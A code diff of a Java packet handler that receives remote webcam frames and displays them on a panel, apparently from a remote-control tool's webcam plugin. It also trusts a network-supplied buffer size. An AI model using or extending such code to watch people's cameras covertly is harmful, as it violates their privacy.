@@ -10,31 +10,35 @@ public class Packet120Webcam extends PacketListener {
 
 	@Override
 	public void perform(Client client) {
-		String name = readString(event.getServer().getDataReader());
+		try {
+			String name = WebcamPlugin.readString(client.getDataReader());
 
-		PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.instances.get(event.getServer().getIP());
-		
-		if (name.equals("DISABLED")) {
-			WebcamPlugin.enabled = false;
-
-			if (panel != null) {
-				panel.setNoWebcamFound();
-			}
-		} else {
-			int size = event.getServer().getDataReader().readInt();
-			byte[] buffer = new byte[size];
-			event.getServer().getDataReader().readFully(buffer, 0, buffer.length);
+			PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.getInstances().get(client);
 			
-			if (panel != null) {
-				panel.setCamName(name);
+			if (name.equals("DISABLED")) {
+				WebcamPlugin.enabled = false;
 
-				BufferedImage image = ImageUtils.decodeImage(buffer);
+				if (panel != null) {
+					panel.setNoWebcamFound();
+				}
+			} else {
+				int size = client.getDataReader().readInt();
+				byte[] buffer = new byte[size];
+				client.getDataReader().readFully(buffer, 0, buffer.length);
+				
+				if (panel != null) {
+					panel.setCamName(name);
 
-				Graphics g = panel.image.getGraphics();
-				g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);
+					BufferedImage image = ImageUtils.decodeImage(buffer);
 
-				panel.lbl.repaint();
+					Graphics g = panel.image.getGraphics();
+					g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);
+
+					panel.lbl.repaint();
+				}
 			}
+		} catch (Exception e) {
+			e.printStackTrace();
 		}		
 	}
 
